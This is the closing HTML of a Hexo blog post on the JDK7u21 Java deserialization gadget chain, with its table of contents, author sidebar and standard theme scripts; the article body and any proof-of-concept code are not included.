+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8jdk%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E8%83%BD%E5%88%A9%E7%94%A8%E7%9A%84%E7%B1%BB"><span class="toc-number">1.</span> <span class="toc-text"> 在JDK原生反序列化中能利用的类</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%BB%84%E5%90%88%E6%8A%80"><span class="toc-number">2.</span> <span class="toc-text"> 常用组合技</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E9%93%BE-1%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text"> 模板链 1（加载字节码执行）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E9%93%BE-2jndi-%E6%B3%A8%E5%85%A5"><span class="toc-number">2.2.</span> <span class="toc-text"> 模板链 2（JNDI 注入）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E9%93%BE-3%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">2.3.</span> <span class="toc-text"> 模板链 3（动态代理）</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%9D%E8%B5%96"><span class="toc-number">3.</span> <span class="toc-text"> 依赖</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text"> 分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BEequals"><span class="toc-number">4.1.</span> <span class="toc-text"> 找equals</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hash%E5%80%BC%E6%9E%84%E9%80%A0"><span class="toc-number">4.2.</span> <span class="toc-text"> hash值构造</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0"><span class="toc-number">5.</span> <span class="toc-text"> 构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E9%93%BE%E6%B5%81%E7%A8%8B"><span class="toc-number">6.</span> <span class="toc-text"> 总链流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BBpoc"><span class="toc-number">7.</span> <span class="toc-text"> 总POC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc2"><span class="toc-number">8.</span> <span class="toc-text"> POC2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98poc"><span class="toc-number">9.</span> <span class="toc-text"> 实战POC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload1"><span class="toc-number">9.1.</span> <span class="toc-text"> payload1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload2"><span class="toc-number">9.2.</span> <span class="toc-text"> payload2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D"><span class="toc-number">10.</span> <span class="toc-text"> 修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8u20%E9%93%BE"><span class="toc-number">11.</span> <span class="toc-text"> 8u20链</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "JAVA反序列化-JDK7u21原生反序列化",
+          url: "http://example.com/2025/09/30/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-JDK7u21%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/",
+          excerpt: "",
+          description: "",
+          stripContent: "[TOC] Java的反序列化漏洞有一些时基于第三方jar包的，所以我们不难免会设想是否存在不依赖第三方的Gadget。比如这条JDK7u21的链子，不需要任何其他的jar包。 没有CC依赖，那之前的InvokerTransformer，chainedTransformer，LazyMap等都不能使用了。 其实学习这个链就是主要学习它的思路，毕竟这么老的链实战中怎么可能用到 该文摘自bfengj师傅的Java反序列化]JDK7u21反序列化链学习.md at main · bfengj/CTF，",
+          date: "Tue Sep 30 2025 11:01:22 GMT+0800",
+          updated: "Sun Jan 04 2026 23:35:08 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
